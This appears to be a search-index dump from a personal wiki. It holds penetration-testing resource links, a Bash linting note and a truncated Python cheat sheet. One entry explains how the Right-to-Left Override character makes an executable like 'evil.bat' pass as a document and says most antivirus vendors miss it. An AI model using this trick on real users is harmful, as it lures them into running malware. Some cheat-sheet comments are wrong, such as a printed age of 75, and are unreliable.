https://youtu.be/jPYtRH6zKxw Step 2 - CTF Box - Setup Debian OS Box https://youtu.be/rw7OjKqvMMI Step 3 - CTF Box - Setup the Environment inside the CTF Box https://youtu.be/_aY_zfUuODs Step 4 - CTF Box - Deploy vulnerable web application and export created CTF box https://youtu.be/QM24lT3f198 Step 5 - CTF Box - Export and Import CTF Box to Virtual Box https://youtu.be/gql6rDqv6lY Step 6 - CTF Box - Penetration Testing with File Upload vulnerability in created CTF box https://youtu.be/uCS4nol0wvQ Awesome Opensource https://awesomeopensource.com/ OSCP Write-ups https://astrosec.blogspot.com/2020/03/how-i-went-from-noob-to-oscp-in-90-days.html?m=1#more https://medium.com/@falconspy/useful-oscp-notes-commands-d71b5eda7b02 https://github.com/six2dez/OSCP-Human-Guide https://www.reddit.com/r/oscp/comments/ehkavd/yep_thats_me_i_bet_you_are_wondering_how_i_got/ https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/ https://www.youtube.com/watch?v=buSHZ4ghn78 https://medium.com/@falconspy/oscp-developing-a-methodology-32f4ab471fd6 https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html Linux Bash Shell | Automating the Host Discovery Process https://www.youtube.com/watch?v=thasDa3Ijr4&feature=youtu.be Personal Security Checklist https://github.com/Lissy93/personal-security-checklist Becoming a Penetration Tester/Hacker https://www.reddit.com/r/hacking/comments/fc2xni/becoming_a_penetration_testerhacker/ https://jhalon.github.io/becoming-a-pentester/ Interesting Recon Script (Windows) https://www.wilbursecurity.com/2020/02/interesting-recon-script/ Malware Analysis Video (Windows) https://www.youtube.com/watch?v=TOof8VVjA8M&feature=youtu.be Buffer Overflows https://www.reddit.com/r/HowToHack/comments/e7fh1e/reverse_engineering_and_buffer_overflows_101_to/ Fully automated offensive security framework for reconnaissance and vulnerability scanning https://github.com/j3ssie/Osmedeus Rawsec's CyberSecurity Inventory: A inventory of tools and resources about CyberSecurity. https://inventory.rawsec.ml/ Playing with file extensions in Windows. How to make \".exe\" look like \".txt\" Lets say we have an \u201cevil.bat\u201d. Any capable user won\u2019t be clicking on that! You can use the special character \u201cRight to Left Override\u201d (U+202E) in the middle of the filename to hide the extension. Type: \u201cnotevil.\u201d Then add the special character, then for example type \u201ccod.bat\u201d which is shown as tab.doc due to the Right to Left overrride. The resulting filename would be: Notevil\u202d.\u202d\u202ecod.bat but it would be opened as notevil.cod.bat (try selecting the Notevil\u202d.\u202d\u202ecod.bat Please note that Windows Defender on the latest patch on Windows 10 does notice this and flags it as a virus. Most other vendors do not. Parse and convert Nessus, Nmap (and more tools) to XLSX, CSV https://gitlab.com/0bs1d1an/sr2t Updated Vulnhub VMs (OSCP-Like) https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0 Useful Git repo for Kali https://github.com/BrashEndeavours/hotwax Kali tools help pages https://tools.kali.org/tools-listing Nullbyte videos https://null-byte.wonderhowto.com/ Free iOS Reverse Engineering Course https://github.com/ivRodriguezCA/RE-iOS-Apps https://github.com/iosre/iOSAppReverseEngineering/blob/master/iOSAppReverseEngineering.pdf Windows Enumeration Scripts J.A.W.S - Just another windows script http://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 http://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 http://github.com/pentestmonkey/windows-privesc-check https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS windows exploit suggester Sherlock.ps1 https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Red Teaming Toolkit https://github.com/infosecn1nja/Red-Teaming-Toolkit/blob/master/README.md Free PowerShell Master Class https://www.youtube.com/playlist?list=PLlVtbbG169nFq_hR7FcMYg32xsSAObuq8 NFS privesc https://www.errno.fr/nfs_privesc Google Dorks https://hackingpassion.com/google-dorks-an-easy-way-of-hacking/ https://github.com/BullsEye0/google_dork_list HTB Metasploit https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/ https://infinitelogins.com/2020/01/29/hack-the-box-write-up-arctic/ Free training https://fedvte.usalearning.gov/ Buffer Overflow Attack Tutorial https://www.youtube.com/watch?v=j7AEzGKuKUU OSCP Powershell Reverse Listener https://www.reddit.com/r/oscp/comments/exhygf/oscp_tommorow_quick_questions/ Sudo privesc script https://github.com/TH3xACE/SUDO_KILLER Automated Web Application Testing https://github.com/jaeles-project/jaeles Defeating IDS and Firewalls Video https://singer.cloud/anecdotal/intro-to-shell-strategy/ NSA Python Course https://techdator.net/nsas-python-programming-training-course-is-now-open-for-public-to-learn/ Pentesting Organization https://danielmiessler.com/study/security-assessment-types/ http://www.pentest-standard.org/index.php/Main_Page Shodan Hacking Guide https://community.turgensec.com/shodan-pentesting-guide/ Red Team Laptop and Infrastructure https://hackingand.coffee/2018/02/assessment-laptop-architecture/ Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker/ 20 Tools Blue Teamers should Have https://www.peerlyst.com/posts/top-20-tools-every-blue-teamer-should-have-in-2020-chiheb-chebbi?trk=search_page_search_result CTFs with Nginx and Docker https://medium.com/@_ahmadsherif/running-up-and-organizing-ctf-events-nginx-docker-481834229ba4","title":"Resources"},{"location":"wiki/Penetration%20Testing/Training/Resources/#links","text":"Github page where you can download Windows VMs legally then hack your way through them through an unpatched vulnerability or setting up a vulnerable software. /dev/random: Sleepy uses VulnInjector, need to provide you own ISO and key. Bobby: 1 uses VulnInjector, need to provide you own ISO and key. https://github.com/enaqx/awesome-pentest","title":"Links"},{"location":"wiki/Penetration%20Testing/Training/Resources/#ubuntu-pentest-setup","text":"https://www.youtube.com/watch?v=YhUiAH5SIqk&feature=youtu.be","title":"Ubuntu pentest setup"},{"location":"wiki/Penetration%20Testing/Training/Resources/#threat-hunting-linux-mitr-attck-framework","text":"https://github.com/Kirtar22/Litmus_Test/blob/master/README_first.md","title":"Threat hunting linux mitr att&amp;ck framework"},{"location":"wiki/Penetration%20Testing/Training/Resources/#bug-bounty-tips-cheat-sheets-and-resources","text":"https://youtu.be/zk7BRjAyM18 https://drive.google.com/file/d/1RhFhWfrlr_Zple_3c9zwuLCU3B-56xJ7/view?usp=drivesdk","title":"Bug Bounty Tips, Cheat Sheets, and Resources"},{"location":"wiki/Penetration%20Testing/Training/Resources/#c2hack-sharing-tips-and-tricks-for-pentesters","text":"https://github.com/G123N1NJ4/c2hack","title":"C2Hack, sharing tips and tricks for pentesters"},{"location":"wiki/Penetration%20Testing/Training/Resources/#creating-a-ctf","text":"Step 1 - CTF-Box - CTF Box Creating with Virtual Box and Windows XP https://youtu.be/jPYtRH6zKxw Step 2 - CTF Box - Setup Debian OS Box https://youtu.be/rw7OjKqvMMI Step 3 - CTF Box - Setup the Environment inside the CTF Box https://youtu.be/_aY_zfUuODs Step 4 - CTF Box - Deploy vulnerable web application and export created CTF box https://youtu.be/QM24lT3f198 Step 5 - CTF Box - Export and Import CTF Box to Virtual Box https://youtu.be/gql6rDqv6lY Step 6 - CTF Box - Penetration Testing with File Upload vulnerability in created CTF box https://youtu.be/uCS4nol0wvQ","title":"Creating a CTF"},{"location":"wiki/Penetration%20Testing/Training/Resources/#awesome-opensource","text":"https://awesomeopensource.com/","title":"Awesome Opensource"},{"location":"wiki/Penetration%20Testing/Training/Resources/#oscp-write-ups","text":"https://astrosec.blogspot.com/2020/03/how-i-went-from-noob-to-oscp-in-90-days.html?m=1#more https://medium.com/@falconspy/useful-oscp-notes-commands-d71b5eda7b02 https://github.com/six2dez/OSCP-Human-Guide https://www.reddit.com/r/oscp/comments/ehkavd/yep_thats_me_i_bet_you_are_wondering_how_i_got/ https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/ https://www.youtube.com/watch?v=buSHZ4ghn78 https://medium.com/@falconspy/oscp-developing-a-methodology-32f4ab471fd6 https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html","title":"OSCP Write-ups"},{"location":"wiki/Penetration%20Testing/Training/Resources/#linux-bash-shell-automating-the-host-discovery-process","text":"https://www.youtube.com/watch?v=thasDa3Ijr4&feature=youtu.be","title":"Linux Bash Shell | Automating the Host Discovery Process"},{"location":"wiki/Penetration%20Testing/Training/Resources/#personal-security-checklist","text":"https://github.com/Lissy93/personal-security-checklist","title":"Personal Security Checklist"},{"location":"wiki/Penetration%20Testing/Training/Resources/#becoming-a-penetration-testerhacker","text":"https://www.reddit.com/r/hacking/comments/fc2xni/becoming_a_penetration_testerhacker/ https://jhalon.github.io/becoming-a-pentester/","title":"Becoming a Penetration Tester/Hacker"},{"location":"wiki/Penetration%20Testing/Training/Resources/#interesting-recon-script-windows","text":"https://www.wilbursecurity.com/2020/02/interesting-recon-script/","title":"Interesting Recon Script (Windows)"},{"location":"wiki/Penetration%20Testing/Training/Resources/#malware-analysis-video-windows","text":"https://www.youtube.com/watch?v=TOof8VVjA8M&feature=youtu.be","title":"Malware Analysis Video (Windows)"},{"location":"wiki/Penetration%20Testing/Training/Resources/#buffer-overflows","text":"https://www.reddit.com/r/HowToHack/comments/e7fh1e/reverse_engineering_and_buffer_overflows_101_to/","title":"Buffer Overflows"},{"location":"wiki/Penetration%20Testing/Training/Resources/#fully-automated-offensive-security-framework-for-reconnaissance-and-vulnerability-scanning","text":"https://github.com/j3ssie/Osmedeus","title":"Fully automated offensive security framework for reconnaissance and vulnerability scanning"},{"location":"wiki/Penetration%20Testing/Training/Resources/#rawsecs-cybersecurity-inventory-a-inventory-of-tools-and-resources-about-cybersecurity","text":"https://inventory.rawsec.ml/","title":"Rawsec's CyberSecurity Inventory: A inventory of tools and resources about CyberSecurity."},{"location":"wiki/Penetration%20Testing/Training/Resources/#playing-with-file-extensions-in-windows-how-to-make-exe-look-like-txt","text":"Lets say we have an \u201cevil.bat\u201d. Any capable user won\u2019t be clicking on that! You can use the special character \u201cRight to Left Override\u201d (U+202E) in the middle of the filename to hide the extension. Type: \u201cnotevil.\u201d Then add the special character, then for example type \u201ccod.bat\u201d which is shown as tab.doc due to the Right to Left overrride. The resulting filename would be: Notevil\u202d.\u202d\u202ecod.bat but it would be opened as notevil.cod.bat (try selecting the Notevil\u202d.\u202d\u202ecod.bat Please note that Windows Defender on the latest patch on Windows 10 does notice this and flags it as a virus. Most other vendors do not.","title":"Playing with file extensions in Windows. How to make \".exe\" look like \".txt\""},{"location":"wiki/Penetration%20Testing/Training/Resources/#parse-and-convert-nessus-nmap-and-more-tools-to-xlsx-csv","text":"https://gitlab.com/0bs1d1an/sr2t","title":"Parse and convert Nessus, Nmap (and more tools) to XLSX, CSV"},{"location":"wiki/Penetration%20Testing/Training/Resources/#updated-vulnhub-vms-oscp-like","text":"https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0","title":"Updated Vulnhub VMs (OSCP-Like)"},{"location":"wiki/Penetration%20Testing/Training/Resources/#useful-git-repo-for-kali","text":"https://github.com/BrashEndeavours/hotwax","title":"Useful Git repo for Kali"},{"location":"wiki/Penetration%20Testing/Training/Resources/#kali-tools-help-pages","text":"https://tools.kali.org/tools-listing","title":"Kali tools help pages"},{"location":"wiki/Penetration%20Testing/Training/Resources/#nullbyte-videos","text":"https://null-byte.wonderhowto.com/","title":"Nullbyte videos"},{"location":"wiki/Penetration%20Testing/Training/Resources/#free-ios-reverse-engineering-course","text":"https://github.com/ivRodriguezCA/RE-iOS-Apps https://github.com/iosre/iOSAppReverseEngineering/blob/master/iOSAppReverseEngineering.pdf","title":"Free iOS Reverse Engineering Course"},{"location":"wiki/Penetration%20Testing/Training/Resources/#windows-enumeration-scripts","text":"J.A.W.S - Just another windows script http://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 http://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 http://github.com/pentestmonkey/windows-privesc-check https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS windows exploit suggester Sherlock.ps1 https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/","title":"Windows Enumeration Scripts"},{"location":"wiki/Penetration%20Testing/Training/Resources/#red-teaming-toolkit","text":"https://github.com/infosecn1nja/Red-Teaming-Toolkit/blob/master/README.md","title":"Red Teaming Toolkit"},{"location":"wiki/Penetration%20Testing/Training/Resources/#free-powershell-master-class","text":"https://www.youtube.com/playlist?list=PLlVtbbG169nFq_hR7FcMYg32xsSAObuq8","title":"Free PowerShell Master Class"},{"location":"wiki/Penetration%20Testing/Training/Resources/#nfs-privesc","text":"https://www.errno.fr/nfs_privesc","title":"NFS privesc"},{"location":"wiki/Penetration%20Testing/Training/Resources/#google-dorks","text":"https://hackingpassion.com/google-dorks-an-easy-way-of-hacking/ https://github.com/BullsEye0/google_dork_list","title":"Google Dorks"},{"location":"wiki/Penetration%20Testing/Training/Resources/#htb-metasploit","text":"https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/ https://infinitelogins.com/2020/01/29/hack-the-box-write-up-arctic/","title":"HTB Metasploit"},{"location":"wiki/Penetration%20Testing/Training/Resources/#free-training","text":"https://fedvte.usalearning.gov/","title":"Free training"},{"location":"wiki/Penetration%20Testing/Training/Resources/#buffer-overflow-attack-tutorial","text":"https://www.youtube.com/watch?v=j7AEzGKuKUU","title":"Buffer Overflow Attack Tutorial"},{"location":"wiki/Penetration%20Testing/Training/Resources/#oscp-powershell-reverse-listener","text":"https://www.reddit.com/r/oscp/comments/exhygf/oscp_tommorow_quick_questions/","title":"OSCP Powershell Reverse Listener"},{"location":"wiki/Penetration%20Testing/Training/Resources/#sudo-privesc-script","text":"https://github.com/TH3xACE/SUDO_KILLER","title":"Sudo privesc script"},{"location":"wiki/Penetration%20Testing/Training/Resources/#automated-web-application-testing","text":"https://github.com/jaeles-project/jaeles","title":"Automated Web Application Testing"},{"location":"wiki/Penetration%20Testing/Training/Resources/#defeating-ids-and-firewalls-video","text":"https://singer.cloud/anecdotal/intro-to-shell-strategy/","title":"Defeating IDS and Firewalls Video"},{"location":"wiki/Penetration%20Testing/Training/Resources/#nsa-python-course","text":"https://techdator.net/nsas-python-programming-training-course-is-now-open-for-public-to-learn/","title":"NSA Python Course"},{"location":"wiki/Penetration%20Testing/Training/Resources/#pentesting-organization","text":"https://danielmiessler.com/study/security-assessment-types/ http://www.pentest-standard.org/index.php/Main_Page","title":"Pentesting Organization"},{"location":"wiki/Penetration%20Testing/Training/Resources/#shodan-hacking-guide","text":"https://community.turgensec.com/shodan-pentesting-guide/","title":"Shodan Hacking Guide"},{"location":"wiki/Penetration%20Testing/Training/Resources/#red-team-laptop-and-infrastructure","text":"https://hackingand.coffee/2018/02/assessment-laptop-architecture/","title":"Red Team Laptop and Infrastructure"},{"location":"wiki/Penetration%20Testing/Training/Resources/#introduction-to-modern-routing-for-red-team-infrastructure-using-traefik-metasploit-covenant-and-docker","text":"https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker/","title":"Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker"},{"location":"wiki/Penetration%20Testing/Training/Resources/#20-tools-blue-teamers-should-have","text":"https://www.peerlyst.com/posts/top-20-tools-every-blue-teamer-should-have-in-2020-chiheb-chebbi?trk=search_page_search_result","title":"20 Tools Blue Teamers should Have"},{"location":"wiki/Penetration%20Testing/Training/Resources/#ctfs-with-nginx-and-docker","text":"https://medium.com/@_ahmadsherif/running-up-and-organizing-ctf-events-nginx-docker-481834229ba4","title":"CTFs with Nginx and Docker"},{"location":"wiki/Programming/Bash/Bash%20Linting/","text":"Bash Linting shellcheck apt install shellcheck dnf install ShellCheck pacman -S shellcheck brew install shellcheck Usage: shellcheck <file>","title":"Bash Linting"},{"location":"wiki/Programming/Bash/Bash%20Linting/#bash-linting","text":"","title":"Bash Linting"},{"location":"wiki/Programming/Bash/Bash%20Linting/#shellcheck","text":"apt install shellcheck dnf install ShellCheck pacman -S shellcheck brew install shellcheck","title":"shellcheck"},{"location":"wiki/Programming/Bash/Bash%20Linting/#usage","text":"shellcheck <file>","title":"Usage:"},{"location":"wiki/Programming/Cheat%20Sheets/Python/","text":"Python Table of Contents Installers Data Types Containers Keywords & Identifiers Arithmetic Operators Assignment Operators Relational Operators Logical Operators Identity & Membership Operators Bitwise Operators Type Conversions Print & Input Formatting Sequences (Ordered Sets) Binary Sequences Mapping & Sets Conditional Statements Iterative Loop Statement Conditional Loop Statement Functions Generic Operations on Containers String Operations List Operations Dictionary Operations Set Operations Lambda Classes & Objects Modules & Packages Errors & Exceptions Math Files Installers Python 3.8 on Windows Python 3.8 On Ubuntu PyCharm on Windows PyCharm on Ubuntu Visual Studio Code on Windows Visual Studio Code on Ubuntu Eclipse on Windows Eclipse on Ubuntu Data Types # Base Data Types Numeric : int , float , complex Boolean : bool # Container Data Types Text : str Sequence : list , tuple , range Mapping : dict Set : set , frozenset Binary Sequence : bytes , bytearray , memoryview # Data Examples int : 12321 , float : 12.342 , complex : 2 + 12 j bool : True str : \"Hello Python\" list : [ \"apple\" , \"banana\" , \"orange\" ], tuple : ( \"apple\" , \"banana\" , \"orange\" ), range : range ( 20 ) dict : { \"name\" : \"Rock\" , \"age\" : 18 } set : { \"apple\" , \"banana\" , \"orange\" }, frozenset : frozenset ({ \"apple\" , \"banana\" , \"orange\" }) bytes : b \"ABC\" , bytearray : bytearray ( 8 ), memoryview : memoryview ( bytes ( 8 )) # Data Range int : unbounded float : 2.2250738585072014e-308 to 1.7976931348623157e+308 Containers ( contains ) # Containers having method __contains__ str : \"Hello Python\" list : [ \"apple\" , \"banana\" , \"orange\" ], tuple : ( \"apple\" , \"banana\" , \"orange\" ), range : range ( 20 ) dict : { \"name\" : \"Rock\" , \"age\" : 18 } set : { \"apple\" , \"banana\" , \"orange\" }, frozenset : frozenset ({ \"apple\" , \"banana\" , \"orange\" }) bytes : b \"ABC\" bytearray : bytearray ( 8 ) # Immutable: str, tuple, frozenset, bytes # Access the contained objects # Iterate over contained objects # Supports in operator tempStr = \"Hello Python\" print ( \"llo\" in tempStr ) # Output: True # Test containers from collections.abc import Container tempStr = \"Hello Python\" print ( isinstance ( tempStr , Container ) ) # Output: True Keywords & Identifiers # Keywords are reserved words in Python # Keywords are case sensitive # Keywords: if, else, elif, for, while, in, as, is, and, or, not, with, from, break, pass, continue, return # Keywords: class, finally, try, assert, def, nonlocal, del, yield # Keywords: import, global, lambda, async, except, await, raise, None, True, False # Identifier can be used as name of variables, classes, or functions # Identifier Rules # Can have a to z, A to Z, 0 to 9, or _ underscore # Cannot start with a digit # Cannot use special characters including !, @, #, $, % # Keywords cannot be used as Identifier # Can be of any length # Identifiers are case sensitive # Identifier Examples # Correct: alpha, _bravo, alpha12, alpha_bravo, alpha_123, this_is_a_long_name # Correct: alpha, Alpha, aLpha, and alphA : all are different # Wrong: 12alpha, @alpha, al!pha, else, while Arithmetic Operators + : Addition : a + b , a + b + c - : Subtraction : a - b , a + b - c * : Multiplication : a * b , a * ( b + c ) / : Division : a / b , ( a + b ) / c % : Modulus : a % b ** : Exponentiation : a ** b // : Floor division : a // b Assignment Operators = : Simple : a = b += : Increment : a += b ~ a = a + b -= : Decrement : a -= b ~ a = a - b *= : Multiplication : a *= b ~ a = a * b /= : Division : a /= b ~ a = a / b %= : Modulus : a %= b ~ a = a % b **= : Exponentiation : a **= b ~ a = a ** b //= : Floor division : a //= b ~ a = a // b Relational Operators == : Equal : a == b != : Not equal : a != b > : Greater than : a > b < : Less than : a < b >= : Greater than or equal to : a >= b <= : Less than or equal to : a <= b Logical Operators and : x == 25 and y == 35 or : x == 25 or y == 35 not : not ( x == 25 and y == 35 ) Identity & Membership Operators # Identity Operators - Tests for same objects is : x is y is not : x is not y # Membership Operators - Tests for sequence in an object in : x in y not in : x not in y Bitwise Operators & : AND : Copies 1 if both bits are 1 , else use 0 | : OR : Copies 1 if either of the bits is 1 , else use 0 ^ : XOR : Copies 1 if only one of the bits is 1 , else use 0 ~ : NOT : Simply flip the bits << : left shift : Shift left and fill by zero on right >> : right shift : Shift right and fill by zero on left Type Conversions # Integers a = int ( 121 ) # 121 b = int ( 21.21 ) # 21 c = int ( \"151\" ) # 151 d = int ( \"15f\" , 16 ) # 351 # Floats a = float ( \"5.25e5\" ) # 525000.0 # Booleans a = '' b = 'abc' c = 12 d = bool ( a ) # False e = bool ( b ) # True f = bool ( c ) # True # Strings a = str ( \"hello\" ) # hello b = str ( 51 ) # 51 c = str ( 25.25 ) # 25.25 Print & Input # Input # Read input as string from console # Convert the input string accordingly fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] choice = input ( \"Enter from 1 to 4:\" ) choice = int ( choice ) if choice < 1 or choice > 4 : print ( \"Wrong choice\" ) else : print ( fruits [ choice - 1 ] ) # Print # print literal values print ( \"Hello Python !!\" ) print ( 15 ) print ( 25.25 ) # print variables name = \"Ricky\" print ( name ) # print expressions start = 20 end = 50 print ( end - start ) Formatting ## Conversion Types d , i - Signed integer decimal , i is not supported by format method o - Unsigned octal , u - Unsigned decimal x , X - Unsigned hexadecimal , leading 0 x or 0 X e , E - Floating point exponential format f , F - Floating point decimal format c - Single character r - String ( converts python object using repr ()) s - String ( converts python object using str ()) # String and Number print ( \" %(name)s , %(age)d \" % { 'name' : \"Joe\" , \"age\" : 25 } ) # Joe, 25 print ( ' {0:s} , {1:d} ' . format ( \"Joe\" , 25 ) ) # Joe, 25 # Fixed digit numbers print ( \" %(name)s , %(age)03d \" % { 'name' : \"Joe\" , \"age\" : 25 } ) # Joe, 025 print ( ' {0:s} , {1:03d} ' . format ( \"Joe\" , 25 ) ) # Joe, 025 # Floating point print ( \" %(name)s , %(weight)3.2f \" % { 'name' : \"Joe\" , \"weight\" : 25.2456 } ) # Joe, 25.25 print ( ' {0:s} , {1:3.2f} ' . format ( \"Joe\" , 25.2456 ) ) # Joe, 25.25 Sequences (Ordered Sets) # string # ordered, indexed, unchangeable (immutable), allows duplicates hello = \"Hello Python !!\" print ( hello [ 0 ] ) # H print ( hello [ 4 ] ) # 0 print ( hello [ 1 , 4 ] ) # syntax error, range not allowed hello [ 0 ] = \"K\" # syntax error, immutable, item assignment not allowed # list # ordered, indexed, changeable (mutable), allows duplicates fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] print ( fruits [ 0 ] ) # apple print ( fruits [ 2 ] ) # orange print ( fruits [ 1 : 3 ] ) # ['banana', 'orange'] print ( fruits [: 2 ] ) # ['apple', 'banana'] print ( fruits [ - 3 : - 1 ] ) # ['banana', 'orange'] print ( fruits [ - 3 :] ) # ['banana', 'orange', 'grapes'] fruits [ 0 ] = \"banana\" print ( fruits [ 0 ] ) # banana print ( fruits [ 1 ] ) # banana # tuple # ordered, indexed, unchangeable (immutable), allows duplicates vehicles = ( \"car\" , \"bus\" , \"truck\" ) print ( vehicles [ 0 ] ) # car print ( vehicles [ 1 ] ) # bus vehicles [ 0 ] = \"bicycle\" # syntax error, immutable, item assignment not allowed # range # generates an immutable sequence of numbers over time a = range ( 5 ) b = range ( 0 , 5 ) c = range ( 0 , 10 , 2 ) print ( a [ 2 ] ) # 2 print ( c [ 2 ] ) # 4 Binary Sequences # bytes # ordered, indexed, unchangeable (immutable), allows duplicates hello1 = b \"Hello Python !!\" hello2 = bytes ( 'Hello Python !!' , 'utf8' ) print ( hello1 [ 0 ] ) # 72 print ( hello2 [ 4 ] ) # 111 print ( hello1 ) # b'Hello Python !!' print ( hello1 . decode () ) # Hello Python !! print ( hello [ 1 , 4 ] ) # syntax error, range not allowed hello [ 0 ] = \"K\" # syntax error, immutable, item assignment not allowed # bytearray hello1 = bytearray ( b \"Hello Python !!\" ) hello2 = bytearray ( \"Hello Python !!\" , \"utf8\" ) hello3 = bytearray ( [ 72 , 101 , 108 , 108 , 111 ] ) print ( hello1 ) # bytearray(b'Hello Python !!') print ( hello2 ) # bytearray(b'Hello Python !!') print ( hello3 ) # bytearray(b'Hello') print ( hello3 . decode () ) # Hello Mapping & Sets # dict # unordered, indexed, changeable (mutable), allows duplicates person = { \"name\" : \"Joe\" , \"age\" : 24 } print ( person [ \"name\" ] ) # Joe print ( person [ \"age\" ] ) # 24 print ( person . get ( \"name\" ) ) # Joe print ( person ) # {'name': 'Joe', 'age': 24} person [ \"name\" ] = \"Jack\" print ( person [ \"name\" ] ) # Jack # convert list of list or tuple to dict person1 = dict ( [ [ \"name\" , \"Joe\" ], [ \"age\" , 24 ] ] ) person2 = dict ( [ ( \"name\" , \"Joe\" ), ( \"age\" , 24 ) ] ) print ( person1 ) # {'name': 'Joe', 'age': 24} print ( person2 ) # {'name': 'Joe', 'age': 24} # set # unordered, unindexed, changeable (mutable), no duplicates fruits = { \"apple\" , \"banana\" , \"orange\" , \"grapes\" } print ( fruits ) # {'apple', 'grapes', 'orange', 'banana'} print ( fruits ) # {'apple', 'grapes', 'banana', 'orange'} a = fruits [ 0 ] # syntax error, unsubscriptable # convert list or tuple to set fruits1 = set ( [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] ) fruits2 = set ( ( \"apple\" , \"banana\" , \"orange\" , \"grapes\" ) ) print ( fruits1 ) # {'apple', 'orange', 'grapes', 'banana'} print ( fruits2 ) # {'apple', 'orange', 'grapes', 'banana'} # frozenset # unordered, unindexed, unchangeable (immutable), no duplicates Conditional Statements # Statement Blocks - if, else and elif # Statement blocks works using indentations # Statement block executed only if given condition is true # if fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] if \"banana\" in fruits : print ( \"Found Banana\" ) # else if \"banana\" in fruits : print ( \"Found Banana\" ) else : print ( \"Banana is missing\" ) # elif name = \"Joe\" if name == \"Rock\" : print ( \"Rock is performing now\" ) elif name == \"Joe\" : print ( \"Joe is performing now\" ) else : print ( \"Stage is free\" ) Iterative Loop Statement # Iterative Loop - for # Statement blocks works using indentations # Statement block executed for each item of container # Iterate list fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] # Standard for fruit in fruits : print ( fruit ) # Iterate with index using range for i in range ( len ( fruits )): print ( \"Fruit {} : {} \" . format ( i + 1 , fruits [ i ] ) ) # Iterate with index using enumerate for num , name in enumerate ( fruits , start = 1 ): print ( \"Fruit {} : {} \" . format ( num , name ) ) # Iterate set fruits = { \"apple\" , \"banana\" , \"orange\" , \"grapes\" } for fruit in fruits : print ( fruit ) # Iterate dict person = { \"name\" : \"Joe\" , \"age\" : 24 } for key in person : print ( \"Person {} : {} \" . format ( key , person [ key ] ) ) Conditional Loop Statement # Conditional Loop - while # Statement blocks works using indentations # Statement block executed for each item of container till the condition is true # while with condition limit = 5 start = 1 factor = 2 while start <= limit : result = start * factor print ( \"Multiplied {} by {} : {} \" . format ( start , factor , result ) ) start = start + 1 # while with condition and break fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] count = len ( fruits ) index = 0 while index < count : if fruits [ index ] == \"orange\" : print ( \"Found orange\" ) break else : index = index + 1 continue Functions # Declaration & Definition # def functionName(argument1, argument2, argument3) # Declared using the def keyword # Function name must be a valid identifier # Function can have 0 to n arguments # Function arguments can be literal values, variables (valid identifiers), and expressions # Function is a block of code which runs when it is called # Function block can have multiple statements # Function variables exists within the function blocks during the call def sum ( a , b ) : return a + b def subtract ( a , b ) : return a - b def getPerson ( name , age ) : person = { \"name\" : name , \"age\" : age } return person # Call # Functions can be called by passing the arguments according to the declaration a = 20 b = 50 c = sum ( a , b ) d = sum ( b , 50 ) e = subtract ( b , a ) p = getPerson ( \"Joe\" , 25 ) print ( \"Sum - {} plus {} : {} \" . format ( a , b , c ) ) # Sum - 20 plus 50: 70 print ( \"Sum - {} plus 50: {} \" . format ( b , d ) ) # Sum - 50 plus 50: 100 print ( \"Subtraction - {} minus {} : {} \" . format ( b , a , e ) ) # Subtraction - 50 minus 20: 30 print ( \"Person - {} \" . format ( p ) ) # Person - {'name': 'Joe', 'age': 75} Generic Operations on Containers # Containers: str, list, tuple, range, dict, set, frozenset, bytes, bytearray # Uses keys for dictionaries # Generic # Items count: len(container) -> Returns items count # Min value: min(container) -> Returns item having minimum value # Max value: max(container) -> Returns item having maximum value # Sorting: sorted(container) -> Returns items in sorted order # Searching: in operator -> item in container, item not in container # Iterate: enumerate(container) -> returns iterator to iterate the container # All true: all(container) -> Returns True if all items evaluates to true # Any one true: any(container) -> Returns True if any one of the items evaluates to true # Numeric # Items sum: sum(container) -> Returns sum of all items value, works for containers having numeric items # Ordered Sequences # Reversed: reversed(container) -> Returns the items in reversed order # Item index: container.index(val) -> Finds the index of given item value String Operations hello = \"Hello Python !!\" fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] # Split, Join, and Strip - split, join, and strip print ( hello . split ( ' ' ) ) # Split using space as delimiter -> ['Hello', 'Python', '!!'] print ( ',' . join ( fruits ) ) # Join using comma as delimiter -> apple,banana,orange,grapes print ( hello . strip () ) # Strips whitespace on left and right -> 'Hello Python !!' # Searching - startsWith and endsWith # Tests whether sub-string is found print ( hello . startswith ( \"He\" ) ) # True -> Without start and end parameters print ( hello . startswith ( \"llo\" , 2 , 8 ) ) # True -> With start and end parameters print ( hello . startswith ( \"Pyt\" , 6 ) ) # True -> With start parameter # Searching - find and index # Returns starting index if found, find returns -1, index throws exception print ( hello . find ( \"llo\" ) ) # 2 -> Without start and end parameters print ( hello . find ( \"Pyth\" , 4 , 11 ) ) # 6 -> With start and end parameters print ( hello . index ( \"llo\" ) ) # 2 -> Without start and end parameters print ( hello . index ( \"Pyth\" , 4 , 11 ) ) # 6 -> 